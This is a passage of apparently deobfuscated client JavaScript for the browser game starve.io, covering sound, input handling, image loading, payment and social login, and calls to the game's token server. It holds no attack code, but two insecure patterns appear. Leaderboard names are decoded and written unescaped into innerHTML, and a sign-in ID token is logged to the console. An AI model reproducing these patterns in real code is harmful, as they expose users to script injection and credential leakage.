            _[j] = A_.sample[n + j][s];
            i.sound.volume(a, _[j]);
          }
        }
      };
      this.init = function () {
        A_.load_sound();
        A_.samples.punch = [];
        A_.samples.weapon = [];
        A_.samples.dig = [];
        A_.organize_samples(A_.samples.punch, e_.PUNCH, Xs, 3, "p", 0.15);
        A_.organize_samples(A_.samples.weapon, e_.WEAPON, Xs, 4, "w", 0.15);
        A_.organize_samples(A_.samples.dig, e_.DIG, Xs, 3, "d", 0.09);
        A_.volume_sample(A_.sample.hand, A_.player.hand, 0.15);
        A_.volume_sample(A_.sample.hwood, A_.player.hwood, 0.2);
        A_.volume_sample(A_.sample.hstone, A_.player.hstone, 1);
        A_.area.sea = new i_(Ks, this.sample.seanight, this.sample.seaday, Us, 0.05, 0.4, e_.AMBIENCE.sound, xs, {
          x: Ie.SEE_BIOME_X,
          y: Ie.WINTER_BIOME_Y,
          w: s_.w,
          h: s_.h
        }, {
          x: Ie.SEE_BIOME_X - 2300,
          y: Ie.WINTER_BIOME_Y - 4000,
          w: s_.w,
          h: s_.h
        }, {
          x: Ie.SEE_BIOME_X - 1500,
          y: Ie.WINTER_BIOME_Y - 2000,
          w: s_.w,
          h: s_.h
        });
        A_.area.forest = new i_(Ys, this.sample.forestnight, this.sample.forestday, ks, 0.03, 0.25, e_.AMBIENCE.sound, xs, {
          x: 0,
          y: Ie.WINTER_BIOME_Y + 800,
          w: Ie.SEE_BIOME_X - 2300,
          h: s_.h
        }, {
          x: -100,
          y: Ie.WINTER_BIOME_Y - 300,
          w: Ie.SEE_BIOME_X - 100,
          h: s_.h
        }, {
          x: -100,
          y: Ie.WINTER_BIOME_Y + 400,
          w: Ie.SEE_BIOME_X - 1400,
          h: s_.h
        });
        A_.area.snow = new i_(Ys, this.sample.snownight, this.sample.snowday, Fs, 0.01, 0.22, e_.AMBIENCE.sound, xs, {
          x: -100,
          y: -100,
          w: s_.w + 200,
          h: Ie.WINTER_BIOME_Y - 1000
        }, {
          x: -100,
          y: -100,
          w: s_.w + 200,
          h: Ie.WINTER_BIOME_Y + 600
        }, {
          x: -100,
          y: -100,
          w: s_.w + 200,
          h: Ie.WINTER_BIOME_Y + 100
        });
        for (var e = 0; e < Xs; e++) {
          A_.players[e] = new r_(e);
        }
        A_.players[0].init(__.uid);
        A_.loaded = 1;
      };
      this.launch = function () {
        if (!this.transition && s_.clock.now < Js) {
          this.transition = 1;
        }
      };
      this.quit = function () {
        if (this.run && this.loaded) {
          for (var e in A_.sample) {
            var i = A_.sample[e];
            if (typeof i == "object") {
              for (var t = 0; t < i.length; t++) {
                A_.player[e].stop(i[t]);
              }
            } else {
              A_.player[e].stop(i);
            }
          }
          for (t = 0; t < A_.players.length; t++) {
            A_.players[t].clean();
          }
        }
      };
      this.select = function () {
        if (A_.run) {
          A_.quit();
        } else {
          if (!A_.loaded) {
            A_.init();
          }
          A_.players[0].uid = __.uid;
          A_.players[0].free = 0;
          A_.launch();
        }
        A_.run = !A_.run;
      };
    }();
    var d_ = new function () {
      this.set_azerty = function () {
        this.LEFT = 81;
        this.RIGHT = 68;
        this.TOP = 90;
        this.DOWN = 83;
      };
      this.set_qwerty = function () {
        this.LEFT = 65;
        this.RIGHT = 68;
        this.TOP = 87;
        this.BOTTOM = 83;
      };
      this.UP = 0;
      this.DOWN = 1;
      this._1 = 49;
      this._2 = 50;
      this._3 = 51;
      this._4 = 52;
      this._5 = 53;
      this.CTRL = 17;
      this.ARROW_LEFT = 37;
      this.ARROW_RIGHT = 39;
      this.ARROW_TOP = 38;
      this.ARROW_BOTTOM = 40;
      this.SPACE = 32;
      this.R = 82;
      this.G = 71;
      this.V = 86;
      this.B = 66;
      this.set_qwerty();
      this.keys = new Array(255);
      for (var e = 0; e < 255; e++) {
        this.keys[e] = this.UP;
      }
      this.up = function (e) {
        var i = Math.min(e.charCode || e.keyCode, 255);
        this.keys[i] = this.UP;
      };
      this.down = function (e) {
        var i = Math.min(e.charCode || e.keyCode, 255);
        if (i == this.LEFT || i == this.ARROW_LEFT) {
          this.press_left();
        } else if (i == this.TOP || i == this.ARROW_TOP) {
          this.press_top();
        } else if (i == this.DOWN || i == this.ARROW_DOWN) {
          this.press_bottom();
        } else if (!(i != this.RIGHT && i != this.ARROW_RIGHT)) {
          this.press_right();
        }
        this.keys[i] = this.DOWN;
        return i;
      };
      this.press_left = function () {
        this.keys[this.RIGHT] = this.UP;
        this.keys[this.ARROW_RIGHT] = this.UP;
      };
      this.press_right = function () {
        this.keys[this.LEFT] = this.UP;
        this.keys[this.ARROW_LEFT] = this.UP;
      };
      this.press_bottom = function () {
        this.keys[this.TOP] = this.UP;
        this.keys[this.ARROW_TOP] = this.UP;
      };
      this.press_top = function () {
        this.keys[this.BOTTOM] = this.UP;
        this.keys[this.ARROW_BOTTOM] = this.UP;
      };
      this.clear_directionnal = function () {
        this.keys[this.RIGHT] = this.UP;
        this.keys[this.ARROW_RIGHT] = this.UP;
        this.keys[this.LEFT] = this.UP;
        this.keys[this.ARROW_LEFT] = this.UP;
        this.keys[this.TOP] = this.UP;
        this.keys[this.ARROW_TOP] = this.UP;
        this.keys[this.BOTTOM] = this.UP;
        this.keys[this.ARROW_BOTTOM] = this.UP;
      };
      this.is_left = function () {
        return this.keys[this.LEFT] || this.keys[this.ARROW_LEFT];
      };
      this.is_right = function () {
        return this.keys[this.RIGHT] || this.keys[this.ARROW_RIGHT];
      };
      this.is_top = function () {
        return this.keys[this.TOP] || this.keys[this.ARROW_TOP];
      };
      this.is_bottom = function () {
        return this.keys[this.BOTTOM] || this.keys[this.ARROW_BOTTOM];
      };
      this.is_ctrl = function () {
        return this.keys[this.CTRL];
      };
      this.is_1 = function () {
        return this.keys[this._1];
      };
      this.is_2 = function () {
        return this.keys[this._2];
      };
      this.is_3 = function () {
        return this.keys[this._3];
      };
      this.is_4 = function () {
        return this.keys[this._4];
      };
      this.is_space = function () {
        return this.keys[this.SPACE];
      };
      this.is_r = function () {
        return this.keys[this.R];
      };
      this.is_g = function () {
        return this.keys[this.G];
      };
      this.is_v = function () {
        return this.keys[this.V];
      };
      this.is_b = function () {
        return this.keys[this.B];
      };
    }();
    var h_ = new function () {
      this.DOWN = 0;
      this.UP = 1;
      this.IDLE = 2;
      this.IN = 0;
      this.OUT = 1;
      this.pos = {
        x: 0,
        y: 0
      };
      this.x_old = 0;
      this.y_old = 0;
      this.angle = 0;
      this.state = this.IDLE;
      this.dist = this.IN;
      this.down = function () {
        this.state = this.DOWN;
      };
      this.up = function () {
        this.state = this.UP;
      };
      this.update = function () {
        return (this.pos.x != this.x_old || this.pos.y != this.y_old) && (this.x_old = this.pos.x, this.y_old = this.pos.y, true);
      };
    }();
    var I_ = 0;
    var u_ = 0;
    var l_ = new function (e, i, t) {
      this.can = e;
      this.ctx = i;
      this.logo = {
        translate: {
          x: 0,
          y: 0
        },
        style: document.getElementById("loading").style,
        update: function () {
          this.style.left = this.translate.x + "px";
          this.style.top = Math.floor(this.translate.y) + "px";
        }
      };
      this.logo.style.position = "absolute";
      this.logo.style.display = "inline-block";
      this.logo.update();
      this.is_run = true;
      this.stop = function () {
        this.is_run = false;
      };
      this.loading = {
        total: 1
      };
      var r = this;
      var n = function () {};
      var a = 0;
      this.quit_effect = function () {
        r.update();
        if (++a == 40) {
          r.stop();
          return void n();
        }
        window.setTimeout(r.quit_effect, 33);
      };
      this.quit = function (e) {
        n = e;
        r.quit_effect();
      };
      var o = new Date().getTime();
      function s(e) {
        if (e.indexOf("normal-mode") !== -1 || e.indexOf("player0") !== -1) {
          return 1;
        } else if (e.indexOf("day-bag") !== -1 || e.indexOf("night-bag") !== -1 || e.indexOf("day-book") !== -1 || e.indexOf("night-book") !== -1 || e.indexOf("day-player") !== -1 || e.indexOf("night-player") !== -1 || e.indexOf("day-accessory") !== -1 || e.indexOf("night-accessory") !== -1 || e.indexOf("day-crate") !== -1 || e.indexOf("night-crate") !== -1 || e.indexOf("day-skin") !== -1 || e.indexOf("night-skin") !== -1 || e.indexOf("day-river") !== -1 || e.indexOf("night-river") !== -1 || e.indexOf("day-river") !== -1 || e.indexOf("night-river") !== -1 || e.indexOf("day-rock") !== -1 || e.indexOf("night-rock") !== -1 || e.indexOf("day-flower") !== -1 || e.indexOf("night-flower") !== -1 || e.indexOf("day-leaf") !== -1 || e.indexOf("night-leaf") !== -1 || e.indexOf("day-herb") !== -1 || e.indexOf("night-herb") !== -1 || e.indexOf("day-shell") !== -1 || e.indexOf("night-shell") !== -1 || e.indexOf("day-hand-skin") !== -1 || e.indexOf("night-hand-skin") !== -1 || e.indexOf("bignight") !== -1 || e.indexOf("bigday") !== -1 || e.indexOf("bigzday") !== -1 || e.indexOf("bigznight") !== -1 || e.indexOf("tutorial-box") !== -1 || e.indexOf("tuto-") !== -1 || e.indexOf("-leaderboard-") !== -1 || e.indexOf("-lead-") !== -1 || e.indexOf("day-lava-") !== -1 || e.indexOf("night-lava-") !== -1 || e.indexOf("-click.png") !== -1 || e.indexOf("-in.png") !== -1 || e.indexOf("-fog") !== -1 || e.indexOf("-lava") !== -1 || e.indexOf("pebblecompo") !== -1 || e.indexOf("avatar-player") !== -1) {
          return 0;
        } else {
          return 1;
        }
      }
      var _ = Object.keys(IMAGES).length;
      console.log("Image to load: ", _);
      for (var E in IMAGES) {
        if (s(IMAGES[E]) === 0) {
          _--;
        }
      }
      console.log("Image to load with high priority: ", _);
      var T = function () {
        if (this.isLoaded !== 0) {
          return this.isLoaded;
        } else {
          this.isLoaded = 2;
          this.src = this._src;
          return 0;
        }
      };
      var A = function (e) {
        this.isLoaded = 1;
      };
      var d = 0;
      var h = function () {
        let e = async () => {
          await client.fetch_server_list();
          (function () {
            console.log("Received server info");
            if (d !== 1) {
              d = 1;
              console.log(Date.now() - o);
              if (Ge !== Ce) {
                Ce();
              }
              Ge();
              var e = Utils.getURLData("server");
              if (e !== null) {
                client.privateServer = 1;
                client.server_list = [{
                  nu: 0,
                  m: 100,
                  i: "server" + e + ".starve.io",
                  p: 443,
                  a: "Private Server " + e,
                  ssl: 1
                }];
              }
              client.update_server_list();
              setTimeout(t, 100);
            }
          })();
        };
        if (document.fonts && document.fonts.check) {
          if (document.fonts.check("1em Baloo Paaji")) {
            setTimeout(e, 100);
          } else {
            setTimeout(h, 100);
          }
        } else {
          setTimeout(e, 1000);
        }
      };
      var I = function () {
        var e = this.src;
        var i = s(e) === 0 ? 10000 : 2000;
        setTimeout(function () {
          for (var i in DUMP_IMAGES) {
            if (e.indexOf(DUMP_IMAGES[i]) !== -1) {
              IMAGES[i] = new Image();
              IMAGES[i].onload = A;
              IMAGES[i].onerror = I;
              IMAGES[i].src = e;
              break;
            }
          }
        }, i);
      };
      function u(e) {
        for (var i in IMAGES) {
          var t = IMAGES[i];
          if (typeof t == "string") {
            if (s(t) === e) {
              IMAGES[i] = new Image();
              IMAGES[i].isLoaded = 0;
              IMAGES[i].onload = A;
              IMAGES[i].onerror = I;
              IMAGES[i].tryLoad = T;
              if (window.location.protocol !== "https:" || t.includes("https:")) {
                IMAGES[i]._src = t;
              } else {
                IMAGES[i]._src = "https://starve.io/" + t;
              }
            }
          }
        }
      }
      u(1);
      u(0);
      Zi(1, "l", 20, "#000");
      h();
      Rn();
      this.update = function () {
        this.logo.translate.x = (S - 500) / 2;
        this.logo.translate.y = (p - 150) / 2;
        var e = 2500 / (40 - a + 1) - 48;
        this.logo.translate.y -= e;
        this.logo.update();
      };
      this.logo.update();
      this.draw = function () {
        try {
          Cn();
        } catch (e) {}
        this.update();
      };
    }(N, D, function () {
      gn();
      T_ = new ys(N, D);
      (n_ = new Ps(N, D)).login_after();
      E_ = new Ws(N, D);
      s_ = new Rs();
      __ = new Cs();
      l_.quit(function () {
        l_.logo.style.display = "none";
        n_.run();
      });
    });
    window.onbeforeunload = function () {
      if (T_.is_run) {
        return "Are you sure you want quit starve.io ;-; ?";
      }
    };
    ae();
    (function e(i) {
      window.requestAnimationFrame(e);
      I_ = (i - u_) / 1000;
      u_ = i;
      I_ = I_ > 1 ? 1 : I_;
      if (T_.is_run) {
        T_.draw();
      } else {
        D.clearRect(0, 0, S, p);
        if (l_.is_run) {
          l_.draw();
        } else if (n_.is_run) {
          n_.draw();
        } else if (E_.is_run) {
          E_.draw();
        }
      }
    })(0);
    window.aiptag = window.aiptag || {};
    window.aiptag.consented = true;
    window.aiptag.cmd = window.aiptag.cmd || [];
    window.aiptag.cmd.display = window.aiptag.cmd.display || [];
    window.aiptag.cmd.player = window.aiptag.cmd.player || [];
    window.aiptag.cmd.player.push(function () {
      client.connect();
    });
    new XMLHttpRequest().onreadystatechange = function () {
      if (this.readyState === 4) {
        this.status;
      }
    };
    var O_ = "https://token.starve.io/";
    if (o === n.DEV) {
      O_ = "http://localhost:3002/";
    }
    var c_ = 0;
    var R_ = 1;
    var g_ = undefined;
    var C_ = undefined;
    var N_ = undefined;
    var b_ = 0;
    window.onUserLogin = function () {
      b_ = 1;
    };
    var D_ = {
      access_token: "ACCESS_TOKEN"
    };
    var S_ = document.createElement("script");
    S_.type = "text/javascript";
    S_.async = true;
    S_.src = "https://static.xsolla.com/embed/paystation/1.0.7/widget.min.js";
    S_.addEventListener("load", function (e) {
      window.XPayStationWidget.init(D_);
      window.XPayStationWidget.on("status-done", z_);
    }, false);
    document.getElementsByTagName("head")[0].appendChild(S_);
    window.fbAsyncInit = function () {
      G_();
      console.log("fb async init called");
    };
    (function (e, i, t) {
      var r;
      var n = e.getElementsByTagName(i)[0];
      if (!e.getElementById(t)) {
        (r = e.createElement(i)).id = t;
        r.src = "https://connect.facebook.net/en_US/sdk.js";
        n.parentNode.insertBefore(r, n);
      }
    })(document, "script", "facebook-jssdk");
    var p_ = undefined;
    var m_ = undefined;
    window.gapi.load("auth2", function () {
      window.gapi.auth2.init({
        client_id: "604822901057-k3dp7j5qpl6pnfr86rvi4r2qp20nk1oh.apps.googleusercontent.com",
        scope: "profile"
      }).then(e => {
        (p_ = e).isSignedIn.listen(v_);
        p_.currentUser.listen(M_);
        if (p_.isSignedIn.get()) {
          p_.signIn();
        }
        L_();
      });
    });
    var v_ = function (e) {};
    var M_ = function (e) {
      G_();
      if (C_ === undefined && m_ !== undefined) {
        C_ = m_.getAuthResponse().id_token;
        console.log("::: iandev userToken :::", C_);
        if (C_ !== undefined) {
          g_ = c_;
          window.onUserLogin(N_);
        }
      }
      if (e !== undefined && e.isSignedIn() === true) {
        m_ = e;
        window.onUserLogin(e.id);
      }
    };
    var L_ = function () {
      if (p_) {
        m_ = p_.currentUser.get();
      }
    };
    function G_() {
      if (N_ === undefined) {
        (function () {
          try {
            if (window.FB && window.FB.getUserID()) {
              N_ = window.FB.getUserID();
              if (C_ === undefined) {
                window.FB.getLoginStatus(function () {
                  g_ = R_;
                  C_ = window.FB.getAuthResponse().accessToken;
                  window.onUserLogin(N_);
                });
              }
            }
          } catch (e) {}
          try {
            N_ = m_.getBasicProfile().getId();
          } catch (e) {}
        })();
      }
    }
    function f_(e) {
      if (N_) {
        var i = new XMLHttpRequest();
        i.open("GET", O_ + "xsolla?userid=" + N_ + "&item=" + e);
        i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        i.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200 && i.responseText !== "0") {
            D_.access_token = i.responseText;
            window.XPayStationWidget.init(D_);
            window.XPayStationWidget.open();
          }
        };
        i.send();
      }
    }
    function H_(e) {
      var i = new XMLHttpRequest();
      i.open("GET", O_ + "setRegion?token=" + C_ + "&userid=" + N_ + "&region=" + e);
      i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      i.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (i.responseText !== "0") {
            n_.select_subview(n_.__SERVER_DURATION__);
          } else {
            n_.select_subview(n_.__GAME__);
          }
        }
      };
      i.send();
    }
    function P_(e, i) {
      if (!(n_.spin > 0)) {
        if (n_.bread < i) {
          n_.select_subview(n_.__BUY__);
        } else {
          n_.spin = 2;
          n_.spin_effect = 0;
          n_.spin_target = 100;
          var t = new XMLHttpRequest();
          t.open("GET", O_ + "buySpin?token=" + C_ + "&userid=" + N_ + "&spin=" + e);
          t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          t.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
              if (t.responseText !== "0") {
                var e = JSON.parse(t.responseText);
                n_.play_spin(e.rand * Math.PI * 2, e.type, e.id);
                n_.bread -= i;
              } else {
                n_.spin = 0;
              }
            }
          };
          t.send();
        }
      }
    }
    function y_() {
      if (!(n_.bread < 300 && n_.firstName > 0)) {
        var e = document.getElementById("account_nickname_input").value.trim();
        document.getElementById("account_nickname_input").value = e;
        if (!(e.length < 1 || e.length > 20)) {
          var i = new XMLHttpRequest();
          i.open("GET", O_ + "changeNickname?token=" + C_ + "&userid=" + N_ + "&nickname=" + encodeURIComponent(e));
          i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          i.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200 && i.responseText !== "0") {
              var e = Number(i.responseText);
              if (e > 0) {
                n_.bread -= e;
              }
              n_.firstName = 1;
              n_.select_subview(n_.__PROFILE__);
            }
          };
          i.send();
        }
      }
    }
    function B_(e, i) {
      var t = new XMLHttpRequest();
      t.open("GET", O_ + "buyKit?token=" + C_ + "&userid=" + N_ + "&kit=" + e);
      t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      t.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200 && t.responseText !== "0") {
          var e = JSON.parse(t.responseText);
          n_.bread -= i;
          n_.kit = Date.now() + Number(e);
        }
      };
      t.send();
    }
    function z_() {
      var e = new XMLHttpRequest();
      e.open("GET", O_ + "claimBread?userid=" + N_);
      e.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      e.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200 && e.responseText !== "0") {
          var i = Number(e.responseText);
          if (!isNaN(i)) {
            n_.bread = i;
          }
        }
      };
      e.send();
    }
    function W_(e, i, t, r) {
      e = e === undefined ? n_.leaderboard_range : e;
      i = i === undefined ? n_.leaderboard_mode : i;
      t = t === undefined ? n_.leaderboard_sorted : t;
      r = r === undefined ? n_.leaderboard_season : r;
      if (e !== n_.leaderboard_range || i !== n_.leaderboard_mode || t !== n_.leaderboard_sorted || r !== n_.leaderboard_season) {
        n_.leaderboard_range = e;
        n_.leaderboard_mode = i;
        n_.leaderboard_sorted = t;
        n_.leaderboard_season = r;
        if (n_.LEADERBOARD_SEASON1 === r) {
          r = "0";
        } else if (n_.LEADERBOARD_SEASON2 === r) {
          r = "1";
        } else if (n_.LEADERBOARD_SEASON3 === r) {
          r = "2";
        } else if (n_.LEADERBOARD_SEASON4 === r) {
          r = "3";
        }
        if (n_.LEADERBOARD_TOTAL === i) {
          i = "total";
        } else if (n_.LEADERBOARD_NORMAL === i) {
          i = "normal";
        } else if (n_.LEADERBOARD_ZOMBIE === i) {
          i = "zombie";
        } else if (n_.LEADERBOARD_VAMPIRE === i) {
          i = "vampire";
        } else if (n_.LEADERBOARD_FOREST === i) {
          i = "forest";
        }
        if (n_.LEADERBOARD_ALL === e) {
          e = "all";
        }
        if (n_.LEADERBOARD_WEEK === e) {
          e = "week";
        }
        if (n_.LEADERBOARD_TODAY === e) {
          e = "today";
        }
        if (n_.LEADERBOARD_KILL === t) {
          t = "kill";
        } else if (n_.LEADERBOARD_SCORE === t) {
          t = "score";
        } else if (n_.LEADERBOARD_TIME === t) {
          t = "time";
        }
        var n = new XMLHttpRequest();
        n.open("GET", O_ + "leaderboard?range=" + e + "&mode=" + i + "&sort=" + t + "&season=" + r);
        n.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        n.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200 && n.responseText !== "0") {
            for (var e = JSON.parse(n.responseText), i = "", t = 0; t < e.length; t++) {
              line = e[t];
              var r = line[1];
              if (r.indexOf("Starver#") === -1) {
                r = window.decodeURIComponent(window.escape(window.atob(r)));
              }
              i += "<div class=\"lineLeaderboard\">";
              i += "<div class=\"rank\">";
              i += t + 1 + "";
              i += "</div>";
              i += "<div class=\"name\">";
              i += r;
              i += "</div>";
              i += "<div class=\"lvl\">";
              i += n_.level_formula(line[6]) + 1 + "";
              i += "</div>";
              i += "<div class=\"kills\">";
              i += line[5] + "";
              i += "</div>";
              i += "<div class=\"time\">";
              i += line[4] + "";
              i += "</div>";
              i += "<div class=\"score\">";
              i += line[3] + "";
              i += "</div>";
              i += "</div>";
            }
            document.getElementById("leaderboard").innerHTML = i;
          }
        };
        n.send();
      }
    }
  }
  window.addEventListener("load", initScript);